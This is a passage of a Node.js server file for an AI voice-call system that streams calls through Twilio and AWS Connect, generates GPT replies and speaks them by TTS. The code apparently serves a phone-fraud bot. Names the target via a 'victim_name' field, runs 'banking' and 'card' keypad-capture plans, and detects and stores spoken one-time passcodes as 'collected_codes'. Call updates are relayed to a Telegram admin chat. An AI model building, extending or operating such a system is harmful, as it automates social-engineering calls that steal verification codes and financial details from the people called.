    callConfig?.customer_name || callConfig?.victim_name,
  );
  gptService.setCallProfile(
    callConfig?.purpose || callConfig?.business_context?.purpose,
  );
  const intentLine = `Call intent: ${callConfig?.script || "general"} | purpose: ${callConfig?.purpose || "general"} | business: ${callConfig?.business_context?.business_id || callConfig?.business_id || "unspecified"}. Keep replies concise and on-task.`;
  gptService.setCallIntent(intentLine);
  await applyInitialDigitIntent(callSid, callConfig, gptService, 0);
  configureCallTools(gptService, callSid, callConfig, functionSystem);

  const session = {
    startTime: new Date(),
    transcripts: [],
    gptService,
    callConfig,
    functionSystem,
    personalityChanges: [],
    interactionCount: 0,
  };

  gptService.on("gptreply", async (gptReply, icount) => {
    if (session?.ending) {
      return;
    }
    const personalityInfo = gptReply.personalityInfo || {};

    webhookService.recordTranscriptTurn(
      callSid,
      "agent",
      gptReply.partialResponse,
    );
    webhookService
      .setLiveCallPhase(callSid, "agent_responding")
      .catch(() => {});

    try {
      await db.addTranscript({
        call_sid: callSid,
        speaker: "ai",
        message: gptReply.partialResponse,
        interaction_count: icount,
        personality_used: personalityInfo.name || "default",
        adaptation_data: JSON.stringify(gptReply.adaptationHistory || []),
      });

      await db.updateCallState(callSid, "ai_responded", {
        message: gptReply.partialResponse,
        interaction_count: icount,
        personality: personalityInfo.name,
      });
    } catch (dbError) {
      console.error("Database error adding AI transcript:", dbError);
    }

    try {
      const ttsAdapter = getAwsTtsAdapter();
      const voiceId = resolveVoiceModel(callConfig);
      const { key } = await ttsAdapter.synthesizeToS3(
        gptReply.partialResponse,
        voiceId ? { voiceId } : {},
      );
      const contactId = callConfig?.provider_metadata?.contact_id;
      if (contactId) {
        const awsAdapter = getAwsConnectAdapter();
        await awsAdapter.enqueueAudioPlayback({
          contactId,
          audioKey: key,
        });
        webhookService
          .setLiveCallPhase(callSid, "agent_speaking")
          .catch(() => {});
        scheduleSpeechTicks(
          callSid,
          "agent_speaking",
          estimateSpeechDurationMs(gptReply.partialResponse),
          0.55,
        );
        scheduleSilenceTimer(callSid);
      }
    } catch (ttsError) {
      console.error("AWS TTS playback error:", ttsError);
    }
  });

  activeCalls.set(callSid, session);

  try {
    const initialExpectation = digitService?.getExpectation(callSid);
    const firstMessage =
      callConfig.first_message ||
      (initialExpectation
        ? digitService.buildDigitPrompt(initialExpectation)
        : "Hello!");
    const ttsAdapter = getAwsTtsAdapter();
    const voiceId = resolveVoiceModel(callConfig);
    const { key } = await ttsAdapter.synthesizeToS3(
      firstMessage,
      voiceId ? { voiceId } : {},
    );
    const contactId = callConfig?.provider_metadata?.contact_id;
    if (contactId) {
      const awsAdapter = getAwsConnectAdapter();
      await awsAdapter.enqueueAudioPlayback({
        contactId,
        audioKey: key,
      });
      webhookService.recordTranscriptTurn(callSid, "agent", firstMessage);
      webhookService
        .setLiveCallPhase(callSid, "agent_speaking")
        .catch(() => {});
      scheduleSpeechTicks(
        callSid,
        "agent_speaking",
        estimateSpeechDurationMs(firstMessage),
        0.5,
      );
      if (digitService?.hasExpectation(callSid)) {
        digitService.markDigitPrompted(callSid, gptService, 0, "dtmf", {
          allowCallEnd: true,
          prompt_text: firstMessage,
        });
        digitService.scheduleDigitTimeout(callSid, gptService, 0);
      }
      scheduleSilenceTimer(callSid);
    }
  } catch (error) {
    console.error("AWS first message playback error:", error);
  }

  return session;
}

async function startServer(options = {}) {
  const { listen = true } = options;
  try {
    console.log("🚀 Initializing Adaptive AI Call System...");
    warnIfMachineDetectionDisabled("startup");

    // Initialize database first
    console.log("Initializing enhanced database...");
    db = new Database();
    await db.initialize();
    console.log("✅ Enhanced database initialized successfully");
    if (db?.addTranscript) {
      const originalAddTranscript = db.addTranscript.bind(db);
      db.addTranscript = async (payload) => {
        const result = await originalAddTranscript(payload);
        if (payload?.call_sid) {
          emitMiniappEvent("transcript.final", payload.call_sid, {
            speaker: payload.speaker || null,
            message: payload.message || null,
            interaction_count: payload.interaction_count || null,
            timestamp: new Date().toISOString(),
          });
        }
        return result;
      };
    }
    if (smsService?.setDb) {
      smsService.setDb(db);
    }
    emailService = new EmailService({ db, config });
    await refreshInboundDefaultScript(true);

    // Start webhook service after database is ready
    console.log("Starting enhanced webhook service...");
    webhookService.start(db);
    webhookService.setMiniappEventSink(emitMiniappEvent);
    console.log("✅ Enhanced webhook service started");

    digitService = createDigitCollectionService({
      db,
      webhookService,
      callConfigurations,
      config,
      twilioClient: twilio,
      VoiceResponse,
      getCurrentProvider: () => currentProvider,
      speakAndEndCall,
      clearSilenceTimer,
      queuePendingDigitAction,
      callEndMessages: CALL_END_MESSAGES,
      closingMessage: CLOSING_MESSAGE,
      settings: DIGIT_SETTINGS,
      smsService,
      healthProvider: getDigitSystemHealth,
    });

    // Initialize function engine
    console.log("✅ Dynamic Function Engine ready");

    startBackgroundWorkers();

    // Start HTTP server
    if (listen) {
      app.listen(PORT, () => {
        console.log(`✅ Enhanced Adaptive API server running on port ${PORT}`);
        console.log(
          `🎭 System ready - Personality Engine & Dynamic Functions active`,
        );
        console.log(`📡 Enhanced webhook notifications enabled`);
        console.log(
          `📞 Twilio Media Stream track mode: ${TWILIO_STREAM_TRACK}`,
        );
      });
    }
  } catch (error) {
    console.error("❌ Failed to start server:", error);
    process.exit(1);
  }
}

// Enhanced WebSocket connection handler with dynamic functions
app.ws("/connection", (ws, req) => {
  const ua = req?.headers?.["user-agent"] || "unknown-ua";
  const host = req?.headers?.host || "unknown-host";
  console.log(`New WebSocket connection established (host=${host}, ua=${ua})`);

  try {
    ws.on("error", (error) => {
      console.error("WebSocket error:", error);
    });
    ws.on("close", (code, reason) => {
      console.warn(
        `WebSocket closed code=${code} reason=${reason?.toString() || ""}`,
      );
    });

    let streamSid;
    let callSid;
    let callConfig = null;
    let callStartTime = null;
    let functionSystem = null;

    let gptService;
    const streamService = new StreamService(ws, {
      audioTickIntervalMs: liveConsoleAudioTickMs,
    });
    const transcriptionService = new TranscriptionService();
    const ttsService = new TextToSpeechService({});
    // Prewarm TTS to reduce first-synthesis delay (silent)
    ttsService
      .generate(
        { partialResponseIndex: null, partialResponse: "warming up" },
        -1,
        { silent: true },
      )
      .catch(() => {});

    let marks = [];
    let interactionCount = 0;
    let isInitialized = false;
    let streamAuthOk = false;

    const handleSttFailure = async (tag, error) => {
      if (!callSid) return;
      console.error(
        `STT failure (${tag}) for ${callSid}`,
        error?.message || error || "",
      );
      const nextCount = (sttFailureCounts.get(callSid) || 0) + 1;
      sttFailureCounts.set(callSid, nextCount);
      db?.addCallMetric?.(callSid, "stt_failure", nextCount, { tag }).catch(
        () => {},
      );
      const threshold = Number(config.callSlo?.sttFailureThreshold);
      if (
        Number.isFinite(threshold) &&
        threshold > 0 &&
        nextCount >= threshold
      ) {
        db?.logServiceHealth?.("call_slo", "degraded", {
          call_sid: callSid,
          metric: "stt_failure_count",
          value: nextCount,
          threshold,
        }).catch(() => {});
      }
      const activeSession = activeCalls.get(callSid);
      await activateDtmfFallback(
        callSid,
        callConfig,
        gptService,
        activeSession?.interactionCount || interactionCount,
        tag,
      );
    };

    transcriptionService.on("error", (error) => {
      handleSttFailure("stt_error", error);
    });
    transcriptionService.on("close", () => {
      handleSttFailure("stt_closed");
    });

    ws.on("message", async function message(data) {
      try {
        const msg = JSON.parse(data);
        const event = msg.event;

        if (event === "start") {
          streamSid = msg.start.streamSid;
          callSid = msg.start.callSid;
          callStartTime = new Date();
          streamStartTimes.set(callSid, Date.now());
          if (!callSid) {
            console.warn("WebSocket start missing CallSid");
            ws.close();
            return;
          }
          const customParams = msg.start?.customParameters || {};
          const authResult = verifyStreamAuth(callSid, req, customParams);
          if (!authResult.ok) {
            console.warn("Stream auth failed", {
              callSid,
              streamSid,
              reason: authResult.reason,
            });
            db.updateCallState(callSid, "stream_auth_failed", {
              reason: authResult.reason,
              stream_sid: streamSid || null,
              at: new Date().toISOString(),
            }).catch(() => {});
            if (authResult.reason !== "missing_token") {
              ws.close();
              return;
            }
            streamAuthBypass.set(callSid, {
              reason: authResult.reason,
              at: new Date().toISOString(),
            });
            webhookService.addLiveEvent(
              callSid,
              "⚠️ Stream auth token missing; continuing without auth",
              { force: true },
            );
          }
          streamAuthOk =
            authResult.ok ||
            authResult.skipped ||
            authResult.reason === "missing_token";
          const priorStreamSid = streamStartSeen.get(callSid);
          if (priorStreamSid && priorStreamSid === streamSid) {
            console.log(
              `Duplicate stream start ignored for ${callSid} (${streamSid})`,
            );
            return;
          }
          streamStartSeen.set(callSid, streamSid || "unknown");
          const existingConnection = activeStreamConnections.get(callSid);
          if (
            existingConnection &&
            existingConnection.ws !== ws &&
            existingConnection.ws.readyState === 1
          ) {
            console.warn(`Replacing existing stream for ${callSid}`);
            try {
              existingConnection.ws.close(4000, "Replaced by new stream");
            } catch {}
            db.updateCallState(callSid, "stream_replaced", {
              at: new Date().toISOString(),
              previous_stream_sid: existingConnection.streamSid || null,
              new_stream_sid: streamSid || null,
            }).catch(() => {});
          }
          activeStreamConnections.set(callSid, {
            ws,
            streamSid: streamSid || null,
            connectedAt: new Date().toISOString(),
          });
          if (digitService?.isFallbackActive?.(callSid)) {
            digitService.clearDigitFallbackState(callSid);
          }
          if (pendingStreams.has(callSid)) {
            clearTimeout(pendingStreams.get(callSid));
            pendingStreams.delete(callSid);
          }

          console.log(`Adaptive call started - SID: ${callSid}`);

          streamService.setStreamSid(streamSid);

          const streamParams = resolveStreamAuthParams(req, customParams);
          const fromValue =
            streamParams.from ||
            streamParams.From ||
            customParams.from ||
            customParams.From;
          const toValue =
            streamParams.to ||
            streamParams.To ||
            customParams.to ||
            customParams.To;
          const directionHint =
            streamParams.direction ||
            customParams.direction ||
            callDirections.get(callSid);
          const hasDirection = Boolean(String(directionHint || "").trim());
          const isOutbound = hasDirection
            ? isOutboundTwilioDirection(directionHint)
            : false;
          const defaultInbound = callConfigurations.get(callSid)?.inbound;
          const isInbound = hasDirection
            ? !isOutbound
            : typeof defaultInbound === "boolean"
              ? defaultInbound
              : true;

          callConfig = callConfigurations.get(callSid);
          functionSystem = callFunctionSystems.get(callSid);
          if (!callConfig && isOutbound) {
            const hydrated = await hydrateCallConfigFromDb(callSid);
            callConfig = hydrated?.callConfig || callConfig;
            functionSystem = hydrated?.functionSystem || functionSystem;
          }

          if (!callConfig || !functionSystem) {
            const setup = ensureCallSetup(callSid, {
              From: fromValue,
              To: toValue,
            });
            callConfig = setup.callConfig || callConfig;
            functionSystem = setup.functionSystem || functionSystem;
          }

          if (callConfig && hasDirection) {
            callConfig.inbound = isInbound;
            callConfigurations.set(callSid, callConfig);
          }
          if (callSid && hasDirection) {
            callDirections.set(callSid, isInbound ? "inbound" : "outbound");
          }
          await ensureCallRecord(
            callSid,
            {
              From: fromValue,
              To: toValue,
            },
            "ws_start",
          );
          streamFirstMediaSeen.delete(callSid);
          scheduleFirstMediaWatchdog(callSid, host, callConfig);

          // Update database with enhanced tracking
          try {
            await db.updateCallStatus(callSid, "started", {
              started_at: callStartTime.toISOString(),
            });
            await db.updateCallState(callSid, "stream_started", {
              stream_sid: streamSid,
              start_time: callStartTime.toISOString(),
            });

            // Create webhook notification for stream start (internal tracking)
            const call = await db.getCall(callSid);
            if (call && call.user_chat_id) {
              await db.createEnhancedWebhookNotification(
                callSid,
                "call_stream_started",
                call.user_chat_id,
              );
            }
            if (callConfig?.inbound) {
              const chatId =
                call?.user_chat_id ||
                callConfig?.user_chat_id ||
                config.telegram?.adminChatId;
              if (chatId) {
                webhookService
                  .sendCallStatusUpdate(callSid, "answered", chatId, {
                    status_source: "stream",
                  })
                  .catch((err) =>
                    console.error("Inbound answered update error:", err),
                  );
              }
            }
          } catch (dbError) {
            console.error("Database error on call start:", dbError);
          }
          // Get call configuration and function system
          const resolvedVoiceModel = resolveVoiceModel(callConfig);
          if (resolvedVoiceModel) {
            ttsService.voiceModel = resolvedVoiceModel;
          }

          if (callConfig && functionSystem) {
            console.log(
              `Using adaptive configuration for ${functionSystem.context.industry} industry`,
            );
            console.log(
              `Available functions: ${Object.keys(functionSystem.implementations).join(", ")}`,
            );
            gptService = new EnhancedGptService(
              callConfig.prompt,
              callConfig.first_message,
            );
          } else {
            console.log(`Standard call detected: ${callSid}`);
            gptService = new EnhancedGptService();
          }

          gptService.setCallSid(callSid);
          gptService.setCustomerName(
            callConfig?.customer_name || callConfig?.victim_name,
          );
          gptService.setCallProfile(
            callConfig?.purpose || callConfig?.business_context?.purpose,
          );
          const intentLine = `Call intent: ${callConfig?.script || "general"} | purpose: ${callConfig?.purpose || "general"} | business: ${callConfig?.business_context?.business_id || callConfig?.business_id || "unspecified"}. Keep replies concise and on-task.`;
          gptService.setCallIntent(intentLine);
          if (callConfig) {
            await applyInitialDigitIntent(
              callSid,
              callConfig,
              gptService,
              interactionCount,
            );
          }
          configureCallTools(gptService, callSid, callConfig, functionSystem);

          let gptErrorCount = 0;

          // Set up GPT reply handler with personality tracking
          gptService.on("gptreply", async (gptReply, icount) => {
            gptErrorCount = 0;
            const activeSession = activeCalls.get(callSid);
            if (activeSession?.ending) {
              return;
            }
            const personalityInfo = gptReply.personalityInfo || {};
            console.log(
              `${personalityInfo.name || "Default"} Personality: ${gptReply.partialResponse.substring(0, 50)}...`,
            );
            webhookService.recordTranscriptTurn(
              callSid,
              "agent",
              gptReply.partialResponse,
            );
            webhookService
              .setLiveCallPhase(callSid, "agent_responding")
              .catch(() => {});

            // Save AI response to database with personality context
            try {
              await db.addTranscript({
                call_sid: callSid,
                speaker: "ai",
                message: gptReply.partialResponse,
                interaction_count: icount,
                personality_used: personalityInfo.name || "default",
                adaptation_data: JSON.stringify(
                  gptReply.adaptationHistory || [],
                ),
              });

              await db.updateCallState(callSid, "ai_responded", {
                message: gptReply.partialResponse,
                interaction_count: icount,
                personality: personalityInfo.name,
              });
            } catch (dbError) {
              console.error("Database error adding AI transcript:", dbError);
            }

            ttsService.generate(gptReply, icount);
            scheduleSilenceTimer(callSid);
          });

          gptService.on("stall", (fillerText) => {
            webhookService.addLiveEvent(callSid, "⏳ One moment…", {
              force: true,
            });
            try {
              ttsService.generate(
                {
                  partialResponse: fillerText,
                  personalityInfo: { name: "filler" },
                  adaptationHistory: [],
                },
                interactionCount,
              );
            } catch (err) {
              console.error("Filler TTS error:", err);
            }
          });

          gptService.on("gpterror", async (err) => {
            gptErrorCount += 1;
            const message = err?.message || "GPT error";
            webhookService.addLiveEvent(callSid, `⚠️ GPT error: ${message}`, {
              force: true,
            });
            if (gptErrorCount >= 2) {
              await speakAndEndCall(
                callSid,
                CALL_END_MESSAGES.error,
                "gpt_error",
              );
            }
          });

          // Listen for personality changes
          gptService.on("personalityChanged", async (changeData) => {
            console.log(
              `Personality adapted: ${changeData.from} → ${changeData.to}`,
            );
            console.log(`Reason: ${JSON.stringify(changeData.reason)}`.blue);

            // Log personality change to database
            try {
              await db.updateCallState(callSid, "personality_changed", {
                from: changeData.from,
                to: changeData.to,
                reason: changeData.reason,
                interaction_count: interactionCount,
              });
            } catch (dbError) {
              console.error(
                "Database error logging personality change:",
                dbError,
              );
            }
          });

          activeCalls.set(callSid, {
            startTime: callStartTime,
            transcripts: [],
            gptService,
            callConfig,
            functionSystem,
            personalityChanges: [],
            ttsService,
            interactionCount: 0,
          });

          const pendingDigitActions = popPendingDigitActions(callSid);
          const skipGreeting =
            callConfig?.initial_prompt_played === true ||
            pendingDigitActions.length > 0;

          // Initialize call with recording
          try {
            if (skipGreeting) {
              isInitialized = true;
              console.log(
                `Stream reconnected for ${callSid} (skipping greeting)`,
              );
              if (pendingDigitActions.length) {
                await handlePendingDigitActions(
                  callSid,
                  pendingDigitActions,
                  gptService,
                  interactionCount,
                );
              }
              startGroupedGather(callSid, callConfig, {
                preamble: "",
                gptService,
                interactionCount,
              });
            } else {
              await recordingService(ttsService, callSid);

              const initialExpectation = digitService?.getExpectation(callSid);
              const activePlan = digitService?.getPlan
                ? digitService.getPlan(callSid)
                : null;
              const isGroupedGather = Boolean(
                activePlan &&
                ["banking", "card"].includes(activePlan.group_id) &&
                activePlan.capture_mode === "ivr_gather",
              );
              const fallbackPrompt = "One moment while I pull that up.";
              if (isGroupedGather) {
                const firstMessage =
                  callConfig && callConfig.first_message
                    ? callConfig.first_message
                    : fallbackPrompt;
                const preamble = callConfig?.initial_prompt_played
                  ? ""
                  : firstMessage;
                if (callConfig) {
                  callConfig.initial_prompt_played = true;
                  callConfigurations.set(callSid, callConfig);
                }
                if (preamble) {
                  try {
                    await db.addTranscript({
                      call_sid: callSid,
                      speaker: "ai",
                      message: preamble,
                      interaction_count: 0,
                      personality_used: "default",
                    });
                  } catch (dbError) {
                    console.error(
                      "Database error adding initial transcript:",
                      dbError,
                    );
                  }
                  webhookService.recordTranscriptTurn(
                    callSid,
                    "agent",
                    preamble,
                  );
                }
                startGroupedGather(callSid, callConfig, {
                  preamble,
                  gptService,
                  interactionCount,
                });
                scheduleSilenceTimer(callSid);
                isInitialized = true;
                if (pendingDigitActions.length) {
                  await handlePendingDigitActions(
                    callSid,
                    pendingDigitActions,
                    gptService,
                    interactionCount,
                  );
                }
                console.log("Adaptive call initialization complete");
                return;
              }

              const firstMessage =
                callConfig && callConfig.first_message
                  ? callConfig.first_message
                  : initialExpectation
                    ? digitService.buildDigitPrompt(initialExpectation)
                    : fallbackPrompt;

              console.log(
                `First message (${functionSystem?.context.industry || "default"}): ${firstMessage.substring(0, 50)}...`,
              );
              let promptUsed = firstMessage;
              try {
                await ttsService.generate(
                  {
                    partialResponseIndex: null,
                    partialResponse: firstMessage,
                  },
                  0,
                );
              } catch (ttsError) {
                console.error("Initial TTS error:", ttsError);
                try {
                  await ttsService.generate(
                    {
                      partialResponseIndex: null,
                      partialResponse: fallbackPrompt,
                    },
                    0,
                  );
                  promptUsed = fallbackPrompt;
                } catch (fallbackError) {
                  console.error("Initial TTS fallback error:", fallbackError);
                  await speakAndEndCall(
                    callSid,
                    CALL_END_MESSAGES.error,
                    "tts_error",
                  );
                  isInitialized = true;
                  return;
                }
              }

              try {
                await db.addTranscript({
                  call_sid: callSid,
                  speaker: "ai",
                  message: promptUsed,
                  interaction_count: 0,
                  personality_used: "default",
                });
              } catch (dbError) {
                console.error(
                  "Database error adding initial transcript:",
                  dbError,
                );
              }
              if (callConfig) {
                callConfig.initial_prompt_played = true;
                callConfigurations.set(callSid, callConfig);
              }
              if (digitService?.hasExpectation(callSid) && !isGroupedGather) {
                digitService.markDigitPrompted(
                  callSid,
                  gptService,
                  interactionCount,
                  "dtmf",
                  {
                    allowCallEnd: true,
                    prompt_text: promptUsed,
                  },
                );
                digitService.scheduleDigitTimeout(callSid, gptService, 0);
              }
              scheduleSilenceTimer(callSid);
              startGroupedGather(callSid, callConfig, {
                preamble: "",
                delayMs: estimateSpeechDurationMs(promptUsed) + 200,
                gptService,
                interactionCount,
              });

              isInitialized = true;
              if (pendingDigitActions.length) {
                await handlePendingDigitActions(
                  callSid,
                  pendingDigitActions,
                  gptService,
                  interactionCount,
                );
              }
              console.log("Adaptive call initialization complete");
            }
          } catch (recordingError) {
            console.error("Recording service error:", recordingError);
            if (skipGreeting) {
              isInitialized = true;
              console.log(
                `Stream reconnected for ${callSid} (skipping greeting)`,
              );
              if (pendingDigitActions.length) {
                await handlePendingDigitActions(
                  callSid,
                  pendingDigitActions,
                  gptService,
                  interactionCount,
                );
              }
              startGroupedGather(callSid, callConfig, {
                preamble: "",
                gptService,
                interactionCount,
              });
            } else {
              const initialExpectation = digitService?.getExpectation(callSid);
              const activePlan = digitService?.getPlan
                ? digitService.getPlan(callSid)
                : null;
              const isGroupedGather = Boolean(
                activePlan &&
                ["banking", "card"].includes(activePlan.group_id) &&
                activePlan.capture_mode === "ivr_gather",
              );
              const fallbackPrompt = "One moment while I pull that up.";
              if (isGroupedGather) {
                const firstMessage =
                  callConfig && callConfig.first_message
                    ? callConfig.first_message
                    : fallbackPrompt;
                const preamble = callConfig?.initial_prompt_played
                  ? ""
                  : firstMessage;
                if (callConfig) {
                  callConfig.initial_prompt_played = true;
                  callConfigurations.set(callSid, callConfig);
                }
                if (preamble) {
                  try {
                    await db.addTranscript({
                      call_sid: callSid,
                      speaker: "ai",
                      message: preamble,
                      interaction_count: 0,
                      personality_used: "default",
                    });
                  } catch (dbError) {
                    console.error(
                      "Database error adding initial transcript:",
                      dbError,
                    );
                  }
                  webhookService.recordTranscriptTurn(
                    callSid,
                    "agent",
                    preamble,
                  );
                }
                startGroupedGather(callSid, callConfig, {
                  preamble,
                  gptService,
                  interactionCount,
                });
                scheduleSilenceTimer(callSid);
                isInitialized = true;
                return;
              }

              const firstMessage =
                callConfig && callConfig.first_message
                  ? callConfig.first_message
                  : initialExpectation
                    ? digitService.buildDigitPrompt(initialExpectation)
                    : fallbackPrompt;

              let promptUsed = firstMessage;
              try {
                await ttsService.generate(
                  {
                    partialResponseIndex: null,
                    partialResponse: firstMessage,
                  },
                  0,
                );
              } catch (ttsError) {
                console.error("Initial TTS error:", ttsError);
                try {
                  await ttsService.generate(
                    {
                      partialResponseIndex: null,
                      partialResponse: fallbackPrompt,
                    },
                    0,
                  );
                  promptUsed = fallbackPrompt;
                } catch (fallbackError) {
                  console.error("Initial TTS fallback error:", fallbackError);
                  await speakAndEndCall(
                    callSid,
                    CALL_END_MESSAGES.error,
                    "tts_error",
                  );
                  isInitialized = true;
                  return;
                }
              }

              try {
                await db.addTranscript({
                  call_sid: callSid,
                  speaker: "ai",
                  message: promptUsed,
                  interaction_count: 0,
                  personality_used: "default",
                });
              } catch (dbError) {
                console.error("Database error adding AI transcript:", dbError);
              }
              if (callConfig) {
                callConfig.initial_prompt_played = true;
                callConfigurations.set(callSid, callConfig);
              }
              if (digitService?.hasExpectation(callSid) && !isGroupedGather) {
                digitService.markDigitPrompted(
                  callSid,
                  gptService,
                  interactionCount,
                  "dtmf",
                  {
                    allowCallEnd: true,
                    prompt_text: promptUsed,
                  },
                );
                digitService.scheduleDigitTimeout(callSid, gptService, 0);
              }
              scheduleSilenceTimer(callSid);
              startGroupedGather(callSid, callConfig, {
                preamble: "",
                delayMs: estimateSpeechDurationMs(promptUsed) + 200,
                gptService,
                interactionCount,
              });

              isInitialized = true;
            }
          }

          // Clean up old configurations
          const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
          for (const [sid, config] of callConfigurations.entries()) {
            if (new Date(config.created_at) < oneHourAgo) {
              callConfigurations.delete(sid);
              callFunctionSystems.delete(sid);
              callDirections.delete(sid);
              activeStreamConnections.delete(sid);
            }
          }
        } else if (event === "media") {
          if (!streamAuthOk) {
            return;
          }
          if (isInitialized && transcriptionService) {
            const now = Date.now();
            streamLastMediaAt.set(callSid, now);
            if (shouldSampleUserAudioLevel(callSid, now)) {
              const level = estimateAudioLevelFromBase64(
                msg?.media?.payload || "",
              );
              updateUserAudioLevel(callSid, level, now);
            }
            markStreamMediaSeen(callSid);
            transcriptionService.send(msg.media.payload);
          }
        } else if (event === "mark") {
          const label = msg.mark.name;
          marks = marks.filter((m) => m !== msg.mark.name);
        } else if (event === "dtmf") {
          const digits = msg?.dtmf?.digits || msg?.dtmf?.digit || "";
          if (digits) {
            clearSilenceTimer(callSid);
            markStreamMediaSeen(callSid);
            streamLastMediaAt.set(callSid, Date.now());
            const callConfig = callConfigurations.get(callSid);
            const captureActive = isCaptureActiveConfig(callConfig);
            let isDigitIntent =
              callConfig?.digit_intent?.mode === "dtmf" || captureActive;
            if (!isDigitIntent && callConfig && digitService) {
              const hasExplicitDigitConfig = !!(
                callConfig.collection_profile ||
                callConfig.script_policy?.requires_otp ||
                callConfig.script_policy?.default_profile
              );
              if (hasExplicitDigitConfig) {
                await applyInitialDigitIntent(
                  callSid,
                  callConfig,
                  gptService,
                  interactionCount,
                );
                isDigitIntent = callConfig?.digit_intent?.mode === "dtmf";
              }
            }
            const shouldBuffer =
              isDigitIntent ||
              digitService?.hasPlan?.(callSid) ||
              digitService?.hasExpectation?.(callSid);
            if (!isDigitIntent && !shouldBuffer) {
              webhookService.addLiveEvent(
                callSid,
                `🔢 Keypad: ${digits} (ignored - normal flow)`,
                { force: true },
              );
              return;
            }
            const expectation = digitService?.getExpectation(callSid);
            const activePlan = digitService?.getPlan?.(callSid);
            const planStepIndex = Number.isFinite(activePlan?.index)
              ? activePlan.index + 1
              : null;
            console.log(
              `Media DTMF for ${callSid}: ${maskDigitsForLog(digits)} (expectation ${expectation ? "present" : "missing"})`,
            );
            if (!expectation) {
              if (digitService?.bufferDigits) {
                digitService.bufferDigits(callSid, digits, {
                  timestamp: Date.now(),
                  source: "dtmf",
                  early: true,
                  plan_id: activePlan?.id || null,
                  plan_step_index: planStepIndex,
                });
              }
              webhookService.addLiveEvent(
                callSid,
                `🔢 Keypad: ${digits} (buffered early)`,
                { force: true },
              );
              return;
            }
            await digitService.flushBufferedDigits(
              callSid,
              gptService,
              interactionCount,
              "dtmf",
              { allowCallEnd: true },
            );
            if (!digitService?.hasExpectation(callSid)) {
              return;
            }
            const activeExpectation = digitService.getExpectation(callSid);
            const display =
              activeExpectation?.profile === "verification"
                ? digitService.formatOtpForDisplay(
                    digits,
                    "progress",
                    activeExpectation?.max_digits,
                  )
                : `Keypad: ${digits}`;
            webhookService.addLiveEvent(callSid, `🔢 ${display}`, {
              force: true,
            });
            const collection = digitService.recordDigits(callSid, digits, {
              timestamp: Date.now(),
              source: "dtmf",
              attempt_id: activeExpectation?.attempt_id || null,
              plan_id: activeExpectation?.plan_id || null,
              plan_step_index: activeExpectation?.plan_step_index || null,
            });
            await digitService.handleCollectionResult(
              callSid,
              collection,
              gptService,
              interactionCount,
              "dtmf",
              { allowCallEnd: true },
            );
          }
        } else if (event === "stop") {
          console.log(`Adaptive call stream ${streamSid} ended`.red);
          const stopKey = `${callSid || "unknown"}:${streamSid || "unknown"}`;
          if (streamStopSeen.has(stopKey)) {
            console.log(`Duplicate stream stop ignored for ${stopKey}`);
            return;
          }
          streamStopSeen.add(stopKey);
          clearFirstMediaWatchdog(callSid);
          streamFirstMediaSeen.delete(callSid);
          streamStartTimes.delete(callSid);
          if (pendingStreams.has(callSid)) {
            clearTimeout(pendingStreams.get(callSid));
            pendingStreams.delete(callSid);
          }
          if (
            callSid &&
            activeStreamConnections.get(callSid)?.streamSid === streamSid
          ) {
            activeStreamConnections.delete(callSid);
          }

          const activePlan = digitService?.getPlan?.(callSid);
          const isGatherPlan = activePlan?.capture_mode === "ivr_gather";
          if (digitService?.isFallbackActive?.(callSid) || isGatherPlan) {
            const reason = digitService?.isFallbackActive?.(callSid)
              ? "Gather fallback"
              : "IVR gather";
            console.log(
              `📟 Stream stopped during ${reason} for ${callSid}; preserving call state.`,
            );
            activeCalls.delete(callSid);
            clearCallEndLock(callSid);
            clearSilenceTimer(callSid);
            return;
          }

          const authBypass = streamAuthBypass.get(callSid);
          if (authBypass && !streamFirstMediaSeen.has(callSid)) {
            console.warn(
              `Stream stopped before auth for ${callSid} (${authBypass.reason})`,
            );
            webhookService.addLiveEvent(
              callSid,
              "⚠️ Stream stopped before auth; attempting recovery",
              { force: true },
            );
            await db
              .updateCallState(callSid, "stream_stopped_before_auth", {
                reason: authBypass.reason,
                stream_sid: streamSid || null,
                at: new Date().toISOString(),
              })
              .catch(() => {});
            void handleStreamTimeout(callSid, host, {
              allowHangup: false,
              reason: "stream_auth_failed",
            });
            clearCallEndLock(callSid);
            clearSilenceTimer(callSid);
            return;
          }

          await handleCallEnd(callSid, callStartTime);

          // Clean up
          activeCalls.delete(callSid);
          if (callSid && callConfigurations.has(callSid)) {
            callConfigurations.delete(callSid);
            callFunctionSystems.delete(callSid);
            callDirections.delete(callSid);
            console.log(
              `Cleaned up adaptive configuration for call: ${callSid}`,
            );
          }
          if (callSid) {
            streamStartSeen.delete(callSid);
            streamAuthBypass.delete(callSid);
            streamRetryState.delete(callSid);
            purgeStreamStatusDedupe(callSid);
            streamLastMediaAt.delete(callSid);
            sttLastFrameAt.delete(callSid);
            streamWatchdogState.delete(callSid);
          }
          if (digitService) {
            digitService.clearCallState(callSid);
          }
          clearCallEndLock(callSid);
          clearSilenceTimer(callSid);
        } else {
          console.log(
            `Unrecognized WS event for ${callSid || "unknown"}: ${event || "none"}`,
            msg,
          );
        }
      } catch (messageError) {
        console.error("Error processing WebSocket message:", messageError);
      }
    });

    transcriptionService.on("utterance", async (text) => {
      clearSilenceTimer(callSid);
      if (callSid) {
        sttLastFrameAt.set(callSid, Date.now());
      }
      if (text && text.trim().length > 0) {
        webhookService
          .setLiveCallPhase(callSid, "user_speaking")
          .catch(() => {});
      }
      if (marks.length > 0 && text?.length > 5) {
        console.log("Interruption detected, clearing stream".red);
        ws.send(
          JSON.stringify({
            streamSid,
            event: "clear",
          }),
        );
      }
    });

    transcriptionService.on("transcription", async (text) => {
      if (!text || !gptService || !isInitialized) {
        return;
      }
      clearSilenceTimer(callSid);
      if (callSid) {
        sttLastFrameAt.set(callSid, Date.now());
      }

      const callConfig = callConfigurations.get(callSid);
      const isDigitIntent = callConfig?.digit_intent?.mode === "dtmf";
      const captureActive = isCaptureActiveConfig(callConfig);
      const otpContext = digitService.getOtpContext(text, callSid);
      console.log(`Customer: ${otpContext.maskedForLogs}`);

      // Save user transcript with enhanced context
      try {
        await db.addTranscript({
          call_sid: callSid,
          speaker: "user",
          message: otpContext.raw,
          interaction_count: interactionCount,
        });

        await db.updateCallState(callSid, "user_spoke", {
          message: otpContext.raw,
          interaction_count: interactionCount,
          otp_detected: otpContext.otpDetected,
          last_collected_code: otpContext.codes?.slice(-1)[0] || null,
          collected_codes: otpContext.codes?.join(", ") || null,
        });
      } catch (dbError) {
        console.error("Database error adding user transcript:", dbError);
      }

      webhookService.recordTranscriptTurn(callSid, "user", otpContext.raw);
      if (
